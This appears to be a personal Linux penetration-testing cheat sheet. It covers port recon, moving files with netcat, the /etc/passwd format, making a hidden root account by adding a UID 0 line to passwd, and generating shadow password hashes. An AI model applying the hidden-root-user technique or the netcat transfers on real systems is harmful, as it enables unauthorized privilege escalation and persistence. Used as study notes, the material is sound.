# General Info

comming soon

# Reconaissance

## Network

* View which ports are open and which processes use them: `ss -lntup` 

# Transfer files

* ssh
* nc
```
#start listener
nc -lvnp 80 > output.txt

#start sender
nc -nv listener_ip 80 < input.txt

#wait some time depending on file size: 10 seconds to 10 minutes...
cat output.txt
```

* bash
* netcat original

# /etc/passwd

## The structure of the passwd file is as follows

<code> oracle:x:1021:1021:Oracle Services:/data/network/oracle:/bin/bash </code>

* Each line of the passwd file represents a set of parameters belonging to a user
* Parameters are separated with :
* Each parameter position is described below (source: [cyberciti](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/))

1. **Username**: It is used when user logs in. It should be between 1 and 32 characters in length.
2. **Password**: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to computes the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file. Password hash may also be present here for backward compatibility, but it precedes the one in shadow file.
3. **User ID** (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4. **Group ID** (GID): The primary group ID (stored in /etc/group file)
5. **User ID Info** (GECOS): The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
6. **Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7. **Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell. For example, sysadmin can use the nologin shell, which acts as a replacement shell for the user accounts. If shell set to /sbin/nologin and the user tries to log in to the Linux system directly, the /sbin/nologin shell closes the connection.

## Use of passwd for privilege escalation

* privilege escalation on Linux may make use of passwd file if something can be appended to it (perform recon)
* For example kernel exploit can be compiled to execute arbitrary command to add a line to passwd file as root to make a hidden user with admin rights...

So to **make oracle user root account**, it is sufficient to add following line

<code> oracle:x:0:0:Oracle Services:/data/network/oracle:/bin/bash </code>

Instead of 1021, we got UID and GID 0, which corresponds to root account. So user orcale is root now.

Additionally one may generate a password hash with crypt function and add it the second position instead of x. 


# Shadow file hash cracking/adding

Generate shadow files ([stackoverflow](https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow)):

<code> openssl passwd -6 -salt xyz  yourpass </code>

Note: passing -1 will generate an MD5 password, -5 a SHA256 and -6 SHA512 (recommended)

To understand which hash you need, check what is $X$:

username:$X$salt$pass....

* $1$ is MD5
* $2a$ is Blowfish
* $2y$ is Blowfish
* $5$ is SHA-256
* $6$ is SHA-512

AND dont forget salt!

# Process Management

* Supress messages from background process

<code>  bg_proc > /dev/null 2>&1 &   </code>


